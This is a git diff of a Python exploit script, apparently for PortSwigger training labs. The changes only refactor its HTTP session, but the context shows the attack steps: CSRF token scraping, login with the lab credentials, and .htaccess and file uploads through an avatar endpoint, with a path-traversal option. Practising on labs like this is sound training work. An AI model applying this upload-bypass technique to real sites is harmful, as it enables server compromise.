@@ -20,7 +20,7 @@ from pathlib import Path
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-session = requests.Session()
+# session = requests.Session()
 dotenv.load_dotenv()
 
 
@@ -29,9 +29,10 @@ class PortSwiggerExploit:
         self.url = url.rstrip("/")
         self.file_location = ""
         self.file_name = ""
+        self.session = requests.Session()
 
     def csrf_token_extract(self, url):
-        url_get = session.get(url).text
+        url_get = self.session.get(url).text
         csrf = re.search(r'name="csrf" value="([^"]+)"', url_get).group(1)
         if csrf:
             return csrf
@@ -60,7 +61,7 @@ class PortSwiggerExploit:
         }
 
 
-        file_upload_post = session.post(url=f"{self.url}/my-account/avatar", data=data, files=files, verify=False)
+        file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=files, verify=False)
         return file_upload_post.status_code
     
     def exploit(self, status_code, path_traversal=False):
@@ -113,11 +114,11 @@ class PortSwiggerExploit:
             'csrf': csrf,
             'user':'wiener'
         }
-        htaccess_upload_post = session.post(url=f"{self.url}/my-account/avatar", data=data, files=htaccess, verify=False)
+        htaccess_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=htaccess, verify=False)
         if htaccess_upload_post.status_code != 200:
             return False
         
-        file_upload_post = session.post(url=f"{self.url}/my-account/avatar", data=data, files=file, verify=False)
+        file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=file, verify=False)
         if file_upload_post.status_code != 200:
             return False
         
@@ -154,7 +155,7 @@ class PortSwiggerExploit:
                 "password": "peter", #credentials given in website
                 "csrf": csrf_token 
             }
-            self.login_page_post = session.post(url=f"{self.url}/login", verify=False, data=login_info, allow_redirects=True)
+            self.login_page_post = self.session.post(url=f"{self.url}/login", verify=False, data=login_info, allow_redirects=True)
             if self.login_page_post.status_code == 200:
                 if self.simple_file_upload():
                     pass
